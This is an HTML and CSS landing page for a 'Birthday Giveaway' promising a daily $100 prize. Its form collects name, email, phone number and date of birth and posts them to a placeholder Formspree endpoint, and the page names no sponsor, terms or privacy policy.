<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Birthday Giveaway</title>

<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;800&display=swap" rel="stylesheet">

<style>

body {
    margin: 0;
    font-family: 'Poppins', sans-serif;
    background: linear-gradient(135deg, #0f2027, #203a43, #2c5364);
}

/* Floating Balloons */
.balloon-layer {
    position: fixed;
    inset: 0;
    pointer-events: none;
    z-index: 0;
}

.balloon {
    position: absolute;
    bottom: -150px;
    width: 100px;
    height: 140px;
    background: radial-gradient(circle at 30% 30%, rgba(255,255,255,0.9), rgba(255,255,255,0.4));
    border-radius: 60% 60% 55% 55%;
    opacity: 0.15;
    animation: floatUp linear infinite;
}

.balloon::after {
    content: "";
    position: absolute;
    bottom: -35px;
    left: 50%;
    width: 2px;
    height: 35px;
    background: rgba(255,255,255,0.3);
    transform: translateX(-50%);
}

.b1 { left: 15%; animation-duration: 20s; }
.b2 { left: 45%; animation-duration: 24s; }
.b3 { left: 75%; animation-duration: 22s; }

@keyframes floatUp {
    0% { transform: translateY(0); }
    100% { transform: translateY(-120vh); }
}

/* Center Layout */
.wrapper {
    display: flex;
    justify-content: center;
    align-items: center;
    min-height: 100vh;
    padding: 20px;
    position: relative;
    z-index: 2;
}

/* Card */
.card {
    position: relative;
    background: rgba(255,255,255,0.97);
    backdrop-filter: blur(20px);
    color: #111;
    padding: 50px 40px;
    border-radius: 20px;
    width: 100%;
    max-width: 520px;
    box-shadow: 0 30px 60px rgba(0,0,0,0.35);
    text-align: center;
}

.card::before {
    content: "";
    position: absolute;
    inset: -40px;
    background: radial-gradient(circle, rgba(255,78,80,0.25), transparent 70%);
    z-index: -1;
    filter: blur(40px);
}

/* Badge */
.badge {
    background: linear-gradient(90deg, #ff4e50, #ff9966);
    color: white;
    padding: 8px 18px;
    border-radius: 30px;
    font-size: 14px;
    font-weight: 600;
    display: inline-block;
    margin-bottom: 20px;
}

h1 {
    font-size: 34px;
    font-weight: 800;
    margin-bottom: 10px;
}

.sub {
    font-size: 16px;
    margin-bottom: 25px;
    color: #555;
}

/* Inputs */
input, select {
    width: 100%;
    padding: 14px;
    margin: 10px 0;
    border-radius: 10px;
    border: 1px solid #ddd;
    font-size: 15px;
    font-family: 'Poppins', sans-serif;
}

.phone-group {
    display: flex;
    gap: 8px;
}

.phone-group select {
    width: 95px;
}

.phone-group input {
    flex: 1;
}

.dob-group {
    display: flex;
    gap: 10px;
}

.dob-group input {
    text-align: center;
}

/* Button */
button {
    width: 100%;
    padding: 16px;
    margin-top: 20px;
    border: none;
    border-radius: 14px;
    background: linear-gradient(90deg, #ff4e50, #ff9966);
    color: white;
    font-size: 18px;
    font-weight: 600;
    cursor: pointer;
}

button:hover {
    transform: translateY(-3px);
    box-shadow: 0 15px 25px rgba(255,78,80,0.4);
}

/* Trust text */
.trust {
    margin-top: 18px;
    font-size: 13px;
    color: #777;
}

</style>
</head>

<body>

<div class="balloon-layer">
    <div class="balloon b1"></div>
    <div class="balloon b2"></div>
    <div class="balloon b3"></div>
</div>

<div class="wrapper">
    <div class="card">

        <div class="badge">Daily $100 Prize</div>

        <h1>Your Birthday Could Pay You 🎉</h1>
        <div class="sub">Enter once. Automatically entered every year.</div>

        <form action="https://formspree.io/f/YOUR_REAL_ID" method="POST">

            <input type="text" name="name" placeholder="Full Name" required>
            <input type="email" name="email" placeholder="Email Address" required>

            <div class="phone-group">
                <select name="country_code" required>
                    <option value="+61">+61</option>
                    <option value="+1">+1</option>
                    <option value="+44">+44</option>
                    <option value="+64">+64</option>
                </select>
                <input type="tel" name="phone" placeholder="Phone Number" required>
            </div>

            <div class="dob-group">
                <input type="text" name="dob_day" placeholder="DD" maxlength="2" required>
                <input type="text" name="dob_month" placeholder="MM" maxlength="2" required>
                <input type="text" name="dob_year" placeholder="YYYY" maxlength="4" required>
            </div>

            <button type="submit">Enter Free Now</button>

        </form>

        <div class="trust">
            Secure entry. No spam. Takes 30 seconds.
        </div>

    </div>
</div>

</body>
</html>
